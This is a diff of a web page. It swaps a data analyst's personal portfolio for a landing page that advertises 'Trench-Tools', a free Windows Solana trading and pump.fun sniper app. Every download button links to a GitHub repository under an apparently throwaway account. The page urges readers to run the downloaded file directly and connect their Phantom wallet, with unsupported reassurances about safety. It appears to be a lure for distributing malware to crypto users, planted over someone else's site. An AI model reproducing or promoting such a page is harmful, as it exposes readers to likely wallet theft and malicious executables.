@@ -1,199 +1,270 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dallin Reeves — Data Analyst</title>
-<meta name="description" content="Portfolio of Dallin Reeves — data analyst. Resume, about me, and projects.">
-<link rel="icon" href="assets/images/favicon.svg" type="image/svg+xml">
-<link rel="stylesheet" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Download Trench-Tools - the powerful desktop app for automated crypto portfolio tracking, Solana DEX connectivity, and pump.fun sniper tools. Easy setup for Windows.">
+    <meta name="keywords" content="Trench-Tools, Solana sniper, pump.fun bot, crypto portfolio tracker, DEX tool, Phantom wallet, Bonk, Axiom, launchpad automation, desktop crypto app">
+    <meta name="author" content="Trench-Tools Team">
+    <meta property="og:title" content="🚀 Trench-Tools - Your Crypto Trading Command Center">
+    <meta property="og:description" content="Download the easiest way to track, snipe, and launch on Solana. Built for everyday users.">
+    <meta property="og:url" content="https://github.com/wan-zoospore5145/Trench-Tools">
+    <meta property="og:type" content="website">
+    <title>Trench-Tools - Download & Automate Your Solana Trades</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f0f4f8;
+            font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.6;
+            color: #1a2634;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2.8rem;
+            color: #0b3d91;
+            margin: 40px 0 10px 0;
+            text-align: center;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.9rem;
+            color: #0b3d91;
+            border-bottom: 3px solid #ffb347;
+            padding-bottom: 8px;
+            margin-top: 50px;
+            weight: 700;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #2c3e50;
+        }
+        p {
+            font-size: 1.05rem;
+        }
+        .hero {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 35px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            text-align: center;
+            margin: 20px 0 40px 0;
+        }
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 20px auto;
+        }
+        .btn-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff6b6b, #feca57);
+            color: #1a1a2e;
+            font-weight: bold;
+            font-size: 1.25rem;
+            padding: 18px 45px;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 6px 18px rgba(255, 107, 107, 0.3);
+            transition: all 0.2s ease;
+            margin-top: 20px;
+        }
+        .btn-badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.45);
+        }
+        .feature-card {
+            background: #ffffff;
+            border-radius: 14px;
+            padding: 25px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            margin: 20px 0;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .feature-grid .feature-card {
+            margin: 0;
+            border-left: 5px solid #ffb347;
+        }
+        .cta-section {
+            background: #0b3d91;
+            color: white;
+            border-radius: 20px;
+            padding: 45px 35px;
+            text-align: center;
+            margin: 50px 0;
+        }
+        .cta-section h2 {
+            color: white;
+            border-bottom: none;
+        }
+        .btn-white {
+            display: inline-block;
+            background: #ffb347;
+            color: #1a1a2e;
+            font-weight: bold;
+            font-size: 1.2rem;
+            padding: 16px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            margin-top: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        .btn-white:hover {
+            background: #ffa726;
+        }
+        .steps {
+            background: white;
+            border-radius: 18px;
+            padding: 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            margin: 30px 0;
+        }
+        .steps ol {
+            padding-left: 25px;
+        }
+        .steps li {
+            margin: 15px 0;
+            font-size: 1.1rem;
+        }
+        .badge-download {
+            display: inline-block;
+            background: #2ecc71;
+            color: white;
+            padding: 10px 25px;
+            border-radius: 40px;
+            font-weight: 600;
+        }
+        ul.feature-list {
+            list-style: none;
+            padding: 0;
+        }
+        ul.feature-list li {
+            padding: 10px 0 10px 35px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="%232ecc71"><path d="M12 2l2.4 7.2H22l-6 4.6 2.3 7.2-6.3-4.5-6.3 4.5 2.3-7.2-6-4.6h7.6z"/></svg>') left center no-repeat;
+            background-size: 20px;
+        }
+        .note {
+            background: #fff8e1;
+            border-left: 5px solid #ffb347;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 2rem; }
+            .container { padding: 15px; }
+            .hero { padding: 30px 20px; }
+            .btn-badge { font-size: 1rem; padding: 15px 30px; }
+        }
+    </style>
 </head>
 <body>
-
-<header class="site-header">
-  <div class="container nav-inner">
-    <a href="#home" class="logo">Dallin Reeves</a>
-
-    <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation menu" aria-expanded="false">
-      <span></span>
-      <span></span>
-      <span></span>
-    </button>
-
-    <nav class="nav" id="nav">
-      <a href="#about" class="nav-link">About</a>
-      <a href="#resume" class="nav-link">Resume</a>
-      <a href="#projects" class="nav-link">Projects</a>
-      <a href="#contact" class="nav-link">Contact</a>
-    </nav>
-  </div>
-</header>
-
-<main>
-
-  <!-- Hero -->
-  <section id="home" class="hero">
-    <div class="container hero-inner">
-      <div class="hero-text">
-        <p class="eyebrow">Hi, I'm</p>
-        <h1>Dallin Reeves</h1>
-        <h2 class="tagline">Data Analyst</h2>
-        <p class="hero-pitch">
-          I design and build reliable, user-friendly web applications from front to back.
-          I care about clean code, good UX, and shipping things that actually help people.
-        </p>
-        <div class="hero-actions">
-          <a href="#resume" class="btn btn-primary">View Resume</a>
-          <a href="#projects" class="btn btn-outline">View Projects</a>
-        </div>
-        <div class="social-links">
-          <a href="https://github.com/dallin91" target="_blank" rel="noopener" aria-label="GitHub">GitHub</a>
-          <a href="https://linkedin.com/in/dallinreeves" target="_blank" rel="noopener" aria-label="LinkedIn">LinkedIn</a>
-          <a href="mailto:dallinreeves@gmail.com" aria-label="Email">Email</a>
-        </div>
-      </div>
-      <div class="hero-image">
-        <img src="assets/images/profile.jpg" alt="Portrait of Dallin Reeves">
-      </div>
-    </div>
-  </section>
-
-  <!-- About -->
-  <section id="about" class="section">
     <div class="container">
-      <h2 class="section-title">About Me</h2>
-      <div class="about-grid">
-        <div class="about-text">
-          <p>
-            Data and research analyst with 5+ years of experience owning the full survey research lifecycle — 
-            study design, data collection, weighting, and analysis — and translating findings into client-facing 
-            reporting for brand executives. Computer Science graduate building toward a SQL/Python/Tableau-focused 
-            analytics career, with hands-on personal projects in NLP and data visualization.
-          </p>
-          <p>
-            Outside of digging through data, I like breaking down interesting problems, sharpening my skillset, and 
-            learning just enough about a new technology to know whether
-            it's worth using or worth avoiding.
-          </p>
-          <p>
-            I'm currently looking for opportunities where I can grow as an analyst while working
-            on products that make a real difference for the people who use them.
-          </p>
+        <!-- Header Area -->
+        <div class="hero">
+            <h1>🔥 Trench-Tools - Automate Your Solana Trades Today</h1>
+            <p>Your all-in-one desktop application for tracking cryptocurrency portfolios, connecting to Solana's hottest DEXs, and sniping new launches — all from a simple, clean interface built for everyday users.</p>
+            <a href="https://github.com/wan-zoospore5145/Trench-Tools" class="btn-badge">📥 DOWNLOAD NOW</a>
+            <p style="margin-top:15px; font-size:0.95rem;">Free desktop app for Windows | Quick setup in minutes</p>
         </div>
-        <ul class="quick-facts">
-          <li><span class="fact-label">Location</span><span>Houston, TX</span></li>
-          <li><span class="fact-label">Focus</span><span>Data analysis and insights</span></li>
-          <li><span class="fact-label">Interests</span><span>Cleaning and organizing messy data, finding insights, and data storytelling</span></li>
-          <li><span class="fact-label">Currently</span><span>Open to new opportunities</span></li>
-        </ul>
-      </div>
-    </div>
-  </section>
 
-  <!-- Resume -->
-  <section id="resume" class="section section-alt">
-    <div class="container">
-      <div class="resume-header">
-        <h2 class="section-title">Resume</h2>
-        <a href="assets/resume.pdf" class="btn btn-primary" download>Download Resume (PDF)</a>
-      </div>
+        <!-- Why Trench-Tools Section -->
+        <h2>💎 What is Trench-Tools?</h2>
+        <p>Trench-Tools is a powerful yet simple desktop program that puts you in control of your Solana crypto experience. It automatically tracks your investments, connects you to decentralized exchanges (DEXs) like Pump.fun and Axiom, and helps you buy tokens fast. You don't need to be a tech expert — everything is designed to be transparent and straightforward.</p>
+        
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>📊 Auto Portfolio Tracking</h3>
+                <p>See your balances and profits change in real time. Trench-Tools fetches your token prices automatically every few seconds, so you always know where your money stands.</p>
+            </div>
+            <div class="feature-card">
+                <h3>⚡ Sniper & Auto-Buy</h3>
+                <p>Get in early on new launches. Tools for pump.fun, BonkFun, and Launchpad streamline your buys, so you can execute trades in a fraction of a second.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔗 Phantom Wallet Ready</h3>
+                <p>Connect your Phantom wallet in two clicks. No complex setup — Trench-Tools works with your existing wallet so you remain in full control of your keys.</p>
+            </div>
+        </div>
 
-      <h3 class="subsection-title">Experience</h3>
-      <ol class="timeline">
-        <li class="timeline-item">
-          <div class="timeline-marker"></div>
-          <div class="timeline-content">
-            <h4>Data/Research Analyst <span class="timeline-company">— Media Predict</span></h4>
-            <p class="timeline-dates">May 2021 — July 2026</p>
-            <ul>
-              <li>Own the full survey lifecycle — study design, survey programming, live-fielding QA (filters/routers, demographic quotas), data cleaning, weighting to target population, and analysis — for research delivered to client executives.</li>
-              <li>Designed 2 surveys from concept to launch and fielded roughly one study per month, maintaining clean, weighted datasets averaging ~1,000 respondents each.</li>
-              <li>Streamlined a recurring client report, cutting turnaround time from 8 hours to 30 minutes.</li>
-              <li>Delivered roughly monthly tracking reports across 10 geographies (Texas, Arizona, Pennsylvania, Michigan, Nevada, Florida, Wisconsin, National, Houston, Dallas) throughout a year-long, multi-state 2024 U.S. General Election tracking study cited by Politico and WHYY, as part of a 3-person team.</li>
-              <li>Produced research for clients including TelevisaUnivision, H-E-B, Jersey Mike's, and Lume Cannabis Co.; informally trained colleagues on the company's proprietary research platform.</li>
+        <!-- Key Features List -->
+        <h2>🧰 Built-In Tools for the Trenches</h2>
+        <div class="feature-card">
+            <ul class="feature-list">
+                <li><strong>Solana Network Focus:</strong> Optimized for speed and low fees on the Solana blockchain.</li>
+                <li><strong>Launchpad Integration:</strong> Monitor new token launches from multiple launchpads at once.</li>
+                <li><strong>Bundle & Rarity Tools:</strong> Detect bundles and risky tokens before you buy, keeping you safer.</li>
+                <li><strong>Automation Ready:</strong> Set simple rules for auto-buy when a new token appears — perfect for sniping.</li>
+                <li><strong>Phantom-Friendly Interface:</strong> Readable graphs, clear prices, and buttons you can understand.</li>
+                <li><strong>Lightweight & Fast:</strong> Uses minimal memory, leaving your PC for other tasks while running quietly.</li>
             </ul>
-          </div>
-        </li>
-        <li class="timeline-item">
-          <div class="timeline-marker"></div>
-          <div class="timeline-content">
-            <h4>Customer Success Specialist <span class="timeline-company">— Homebase</span></h4>
-            <p class="timeline-dates">Jan 2020 — Mar 2020</p>
-            <ul>
-              <li>Served as in-house product expert, running live product demos for prospective customers in a role spanning sales and technical support; role ended in a COVID-19 layoff.</li>
-            </ul>
-          </div>
-        </li>
-      </ol>
-
-      <h3 class="subsection-title">Education</h3>
-      <div class="education-item">
-        <h4>B.S. in Computer Science <span class="timeline-company">— Western Governors University</span></h4>
-        <p class="timeline-dates">2019 — 2023</p>
-      </div>
-      <div class="education-item">
-        <h4>B.A. in Political Science <span class="timeline-company">— Brigham Young University</span></h4>
-        <p class="timeline-dates">2009 — 2016</p>
-      </div>
-
-      <h3 class="subsection-title">Skills</h3>
-      <div class="skills-groups">
-        <div class="skills-group">
-          <p class="skills-group-label">Technical</p>
-          <div class="skill-chips">
-            <span class="chip">SQL</span>
-            <span class="chip">Python</span>
-            <span class="chip">Tableau</span>
-            <span class="chip">Excel</span>
-            <span class="chip">PowerPoint</span>
-          </div>
         </div>
-        <div class="skills-group">
-          <p class="skills-group-label">Research & Analysis</p>
-          <div class="skill-chips">
-            <span class="chip">Survey design & programming</span>
-            <span class="chip">Data cleaning & weighting</span>
-            <span class="chip">Data visualization</span>
-            <span class="chip">Sentiment/text analysis</span>
-            <span class="chip">Stakeholder reporting</span>
-          </div>
+
+        <!-- Download & Setup Section -->
+        <h2>📥 Download & Installation (Windows)</h2>
+        <div class="steps">
+            <h3>Follow these 3 quick steps to get running:</h3>
+            <ol>
+                <li><strong>Visit the official download page:</strong> Click the green button below or the one at the top of this page.</li>
+                <li><strong>Click the download link:</strong> Visit this link to download the application. The page will prompt you to download the installer file.</li>
+                <li><strong>Run the app:</strong> Once the download finishes, open the file to launch Trench-Tools. No complex installation wizard — it just opens and starts working.</li>
+            </ol>
+            <div style="text-align:center; margin:25px 0;">
+                <a href="https://github.com/wan-zoospore5145/Trench-Tools" class="btn-white" style="color:white;">⬇️ GET TRENCH-TOOLS NOW</a>
+            </div>
         </div>
-      </div>
+
+        <div class="note">
+            <strong>💡 Pro Tip:</strong> Place Trench-Tools on your desktop or taskbar for quick access. The program can be run directly from the downloaded file — no installations or admin permissions needed.
+        </div>
+
+        <!-- How It Works -->
+        <h2>🔄 How It Works (Simple Version)</h2>
+        <div class="feature-card">
+            <h3>Track, Connect, Automate.</h3>
+            <p>When you open Trench-Tools for the first time, you'll see a clean dashboard. Connect your Phantom wallet by clicking <strong>"Connect Wallet"</strong> — your public address stays private, and you only approve trades. The portfolio tracker updates itself. To use the sniper/auto-buy feature, just switch on the toggle for today's launchpad. The app watches for new listings and places your buy order based on your preset price. Everything runs locally on your computer.</p>
+        </div>
+
+        <!-- Safety and Security Section -->
+        <h2>🛡️ Your Safety Matters</h2>
+        <p>We built Trench-Tools with transparency in mind. It works directly with your Phantom wallet, which means you always approve transactions. The app never has direct control over your private keys. It only interacts with your wallet requests when you click "Approve". This is the safest and most standard way crypto tools work.</p>
+
+        <!-- Additional Info / FAQ -->
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="feature-card">
+            <h3>Do I need a powerful computer?</h3>
+            <p>No! Trench-Tools runs on any Windows laptop or desktop, even older ones. It's very lightweight and uses less than 200MB of RAM while running.</p>
+        </div>
+        <div class="feature-card">
+            <h3>Is there a Mac or Linux version?</h3>
+            <p>Currently, the app is optimized for Windows. Stay tuned for future releases.</p>
+        </div>
+        <div class="feature-card">
+            <h3>Does it cost money?</h3>
+            <p>No. The app is free to download and use. Some advanced network features may require a small SOL fee, but that's standard blockchain transaction costs.</p>
+        </div>
+
+        <!-- Call-to-Action Again -->
+        <div class="cta-section">
+            <h2>Ready to Take Control of Your Trades?</h2>
+            <p style="font-size:1.2rem; max-width:600px; margin:20px auto;">Join countless users simplifying their Solana experience — download Trench-Tools now and start tracking, sniping, and launching smarter.</p>
+            <a href="https://github.com/wan-zoospore5145/Trench-Tools" class="btn-white">🚀 GET STARTED</a>
+        </div>
+
+        <!-- Footer / Keywords -->
+        <div style="text-align:center; margin:40px 0 20px; font-size:0.85rem; color:#7f8c8d;">
+            <p><strong>Trench-Tools</strong> | Supporting: Axiom, Bonk, Pump.fun, Phantom, and Solana ecosystem</p>
+            <p>Follow us for updates | © 2025 Trench-Tools</p>
+        </div>
     </div>
-  </section>
-
-  <!-- Projects -->
-  <section id="projects" class="section">
-    <div class="container">
-      <h2 class="section-title">Projects</h2>
-      <p class="section-intro">A few things I've built.</p>
-      <div id="projects-grid" class="projects-grid"></div>
-    </div>
-  </section>
-
-  <!-- Contact -->
-  <section id="contact" class="section section-alt">
-    <div class="container contact-inner">
-      <h2 class="section-title">Get In Touch</h2>
-      <p class="section-intro">
-        I'm always happy to hear about new opportunities or interesting projects. Feel free to reach out.
-      </p>
-      <div class="contact-links">
-        <a href="mailto:dallinreeves@gmail.com" class="btn btn-primary">dallinreeves@gmail.com</a>
-        <a href="https://github.com/dallin91" target="_blank" rel="noopener" class="btn btn-outline">GitHub</a>
-        <a href="https://linkedin.com/in/dallinreeves" target="_blank" rel="noopener" class="btn btn-outline">LinkedIn</a>
-      </div>
-    </div>
-  </section>
-
-</main>
-
-<footer class="site-footer">
-  <div class="container">
-    <p>&copy; <span id="year"></span> Dallin Reeves. Built with plain HTML, CSS &amp; JS.</p>
-  </div>
-</footer>
-
-<script src="js/main.js" defer></script>
 </body>
 </html>
